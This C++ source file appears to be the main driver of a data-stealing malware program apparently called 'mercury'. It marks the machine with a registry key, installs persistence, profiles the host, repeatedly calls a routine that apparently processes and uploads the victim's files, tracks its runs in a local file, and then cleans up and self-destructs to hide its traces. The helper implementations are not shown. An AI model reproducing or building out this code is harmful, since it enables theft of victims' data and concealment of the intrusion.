#include "Core/upload.hpp"
#include "Core/self_destruct.hpp"
#include "Core/mark_machine.hpp"
#include "Core/persistence.hpp"
#include "Core/profiler.hpp"



constexpr bool ONETIMERUN = false;
constexpr int TOTALRUNS = 3;
int CURRENTRUNS = 0;
const std::string COUNT_FILE = "run_count.txt";


int LoadRunCount() {
    std::ifstream inFile(COUNT_FILE);

    if (!inFile) {
        return 0;
    }

    int count;
    inFile >> count;
    return count;
}


void SaveRunCount(int count) {
    std::ofstream outFile(COUNT_FILE);
    outFile << count;
}


void CleanupAndDestruct() {
    std::cout << "Beginning cleanup..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    Cleanup();
    std::this_thread::sleep_for(std::chrono::seconds(3));
    SelfDestruct();
}


int main() {
    AddRegKey(L"mercury", L"true");
    PersistOnMachine();
    Profiler();
    CURRENTRUNS = LoadRunCount();

    if (ONETIMERUN) {
        ProcessFilesAndUpload();
        CleanupAndDestruct();
    }

    while (TOTALRUNS > CURRENTRUNS) {
        ProcessFilesAndUpload();
        CURRENTRUNS += 1;
        SaveRunCount(CURRENTRUNS); // Increment and save the count.

        std::cout << "Running " << CURRENTRUNS << std::endl;

        if (TOTALRUNS == CURRENTRUNS) {
            ProcessFilesAndUpload();
            CleanupAndDestruct();
            break; // Exit the loop
        }

        std::cout << "Sleeping for 30 seconds..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }

    return 0;
}

